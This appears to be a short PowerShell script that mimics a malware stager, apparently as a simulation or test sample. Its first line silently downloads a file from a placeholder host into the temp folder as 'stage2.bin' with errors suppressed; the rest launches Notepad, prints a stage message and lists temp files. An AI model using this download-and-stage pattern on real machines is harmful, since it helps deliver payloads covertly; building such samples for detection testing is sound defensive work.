Start-BitsTransfer -Source "http://example.org/assets/update.dat" -Destination "$env:TEMP\stage2.bin" -ErrorAction SilentlyContinue
& 'notepad.exe'
Write-Output "stage 35 initialized"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
